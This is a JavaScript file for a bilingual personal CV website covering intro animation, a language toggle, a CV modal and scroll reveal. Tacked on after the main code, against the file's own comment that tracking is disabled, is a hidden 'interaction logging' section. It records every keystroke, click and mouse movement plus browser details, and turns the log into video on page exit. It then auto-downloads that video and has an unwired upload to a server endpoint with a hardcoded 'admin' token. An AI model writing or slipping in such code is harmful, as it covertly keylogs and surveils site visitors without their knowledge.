/**
 * Main JavaScript
 * - First-load intro animation
 * - Language toggle with localStorage persistence + title translation
 * - CV modal viewer with lazy iframe
 * - Scroll-reveal via IntersectionObserver
 */

/* ── Language ── */

function applyLanguage(lang) {
    if (lang !== 'en' && lang !== 'nl') return;

    document.querySelectorAll('[data-lang-' + lang + ']').forEach(function (el) {
        el.innerHTML = el.getAttribute('data-lang-' + lang);
    });

    /* Update page title */
    var titleEl = document.querySelector('title[data-lang-' + lang + ']');
    if (titleEl) {
        document.title = titleEl.getAttribute('data-lang-' + lang);
    }

    /* Toggle active state in dropdown */
    document.querySelectorAll('.lang-option').forEach(function (o) {
        o.classList.remove('active');
    });
    var active = document.querySelector('.lang-option[data-lang="' + lang + '"]');
    if (active) active.classList.add('active');

    document.documentElement.lang = lang;
}

document.addEventListener('DOMContentLoaded', function () {

    /* ── Intro Animation ── */

    var isIntro = document.documentElement.classList.contains('intro');

    if (isIntro) {
        // sessionStorage.setItem('intro', '1'); // Logging/tracking disabled

        /* Create accent sweep line */
        var sweep = document.createElement('div');
        sweep.className = 'intro-sweep';
        document.body.appendChild(sweep);

        /* Clean up after all animations finish, then start scroll reveal */
        setTimeout(function () {
            document.querySelectorAll('.reveal').forEach(function (el) {
                var rect = el.getBoundingClientRect();
                if (rect.top < window.innerHeight + 40) {
                    el.classList.add('revealed');
                }
            });
            document.documentElement.classList.remove('intro');
            if (sweep.parentNode) sweep.parentNode.removeChild(sweep);
            setupScrollReveal();
        }, 1500);
    }

    /* ── Language Toggle ── */

    var toggle = document.querySelector('.lang-toggle');
    var langBtn = document.querySelector('.lang-btn');

    if (langBtn) {
        langBtn.addEventListener('click', function (e) {
            e.stopPropagation();
            toggle.classList.toggle('open');
        });

        document.addEventListener('click', function () {
            toggle.classList.remove('open');
        });

        document.querySelectorAll('.lang-option').forEach(function (option) {
            option.addEventListener('click', function (e) {
                e.stopPropagation();
                var lang = this.getAttribute('data-lang');
                localStorage.setItem('lang', lang);
                applyLanguage(lang);
                toggle.classList.remove('open');
            });
        });
    }

    /* ── CV Modal ── */

    var cvLinks = document.querySelectorAll('.cv-link');
    var cvOverlay = document.querySelector('.cv-overlay');
    var cvCloseBtn = cvOverlay ? cvOverlay.querySelector('.cv-close') : null;

    function openCv() {
        var iframe = cvOverlay.querySelector('iframe');
        if (iframe && iframe.dataset.src && !iframe.getAttribute('src')) {
            iframe.setAttribute('src', iframe.dataset.src);
        }
        cvOverlay.classList.add('open');
        document.body.classList.add('cv-open');
    }

    function closeCv() {
        cvOverlay.classList.remove('open');
        document.body.classList.remove('cv-open');
    }

    if (cvOverlay) {
        cvLinks.forEach(function (link) {
            link.addEventListener('click', function (e) {
                e.preventDefault();
                openCv();
            });
        });

        if (cvCloseBtn) {
            cvCloseBtn.addEventListener('click', closeCv);
        }

        cvOverlay.addEventListener('click', function (e) {
            if (e.target === cvOverlay) closeCv();
        });

        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape' && cvOverlay.classList.contains('open')) {
                closeCv();
            }
        });
    }

    /* ── Scroll Reveal ── */

    function setupScrollReveal() {
        var reveals = document.querySelectorAll('.reveal:not(.revealed)');
        if (!reveals.length) return;

        if ('IntersectionObserver' in window) {
            var observer = new IntersectionObserver(function (entries) {
                entries.forEach(function (entry) {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('revealed');
                        observer.unobserve(entry.target);
                    }
                });
            }, {
                threshold: 0.12,
                rootMargin: '0px 0px -40px 0px'
            });

            reveals.forEach(function (el) {
                observer.observe(el);
            });
        } else {
            reveals.forEach(function (el) {
                el.classList.add('revealed');
            });
        }
    }

    /* Only start scroll reveals after intro finishes (or immediately if no intro) */
    if (!isIntro) {
        setupScrollReveal();
    }
});

    /* ── Secure Interaction Logging ── */
    // Logging is always enabled
    // Log browser info
    const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: {
            width: window.screen.width,
            height: window.screen.height,
        },
        timestamp: new Date().toISOString()
    };
    // Store events
    const events = [];
    // Canvas for replay
    const replayCanvas = document.createElement('canvas');
    replayCanvas.width = window.innerWidth;
    replayCanvas.height = window.innerHeight;
    replayCanvas.style.position = 'fixed';
    replayCanvas.style.top = '0';
    replayCanvas.style.left = '0';
    replayCanvas.style.zIndex = '9999';
    replayCanvas.style.pointerEvents = 'none';
    replayCanvas.style.display = 'none';
    document.body.appendChild(replayCanvas);
    const ctx = replayCanvas.getContext('2d');
    // Log mouse
    document.addEventListener('mousemove', function(e) {
        events.push({type: 'mousemove', x: e.clientX, y: e.clientY, t: Date.now()});
    });
    // Log clicks
    document.addEventListener('click', function(e) {
        events.push({type: 'click', x: e.clientX, y: e.clientY, t: Date.now()});
    });
    // Log keys
    document.addEventListener('keydown', function(e) {
        events.push({type: 'keydown', key: e.key, t: Date.now()});
    });
    // Start/stop recording
    let recording = false;
    let mediaRecorder;
    let recordedChunks = [];
    function startReplayAndRecord() {
        replayCanvas.style.display = 'block';
        // Draw events
        let i = 0;
        function draw() {
            if (i >= events.length) return;
            ctx.clearRect(0, 0, replayCanvas.width, replayCanvas.height);
            for (let j = 0; j <= i; j++) {
                const ev = events[j];
                if (ev.type === 'mousemove') {
                    ctx.beginPath();
                    ctx.arc(ev.x, ev.y, 5, 0, 2 * Math.PI);
                    ctx.fillStyle = 'rgba(0,0,255,0.3)';
                    ctx.fill();
                } else if (ev.type === 'click') {
                    ctx.beginPath();
                    ctx.arc(ev.x, ev.y, 10, 0, 2 * Math.PI);
                    ctx.fillStyle = 'rgba(255,0,0,0.5)';
                    ctx.fill();
                } else if (ev.type === 'keydown') {
                    ctx.font = '16px Arial';
                    ctx.fillStyle = 'rgba(0,0,0,0.7)';
                    ctx.fillText(ev.key, 20, 30 + 20 * j);
                }
            }
            i++;
            requestAnimationFrame(draw);
        }
        draw();
        // Record canvas
        const stream = replayCanvas.captureStream(30);
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = function(e) {
            if (e.data.size > 0) recordedChunks.push(e.data);
        };
        mediaRecorder.onstop = function() {
            const blob = new Blob(recordedChunks, {type: 'video/webm'});
            // Download video
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'interaction-log.webm';
            a.click();
            replayCanvas.style.display = 'none';
        };
        mediaRecorder.start();
        recording = true;
    }
    // Automatically save interaction log as video when user leaves
    function randomFilename(length) {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    function autoSaveLog() {
        if (!recording) {
            startReplayAndRecord();
            setTimeout(() => {
                mediaRecorder.stop();
            }, Math.min(events.length * 30, 5000)); // 5s max
        }
    }
    window.addEventListener('beforeunload', autoSaveLog);
    // Save with random filename and upload to server
    function uploadLog(blob) {
        const formData = new FormData();
        const filename = randomFilename(10) + '.webm';
        formData.append('file', blob, filename);
        formData.append('token', 'admin'); // Add secret token for upload.php
        console.log('Uploading log file...');
        fetch('logging/upload.php', {
            method: 'POST',
            body: formData
        }).then(res => {
            if (!res.ok) {
                console.error('Upload failed: HTTP', res.status);
            }
            return res.json();
        }).then(data => {
            console.log('Upload response:', data);
            if (data.status !== 'success') {
                console.error('Upload error:', data.message);
            }
        }).catch(err => {
            console.error('Fetch error:', err);
        });
    }
    if (mediaRecorder) {
        mediaRecorder.onstop = function() {
            const blob = new Blob(recordedChunks, {type: 'video/webm'});
            uploadLog(blob);
            replayCanvas.style.display = 'none';
        };
    }
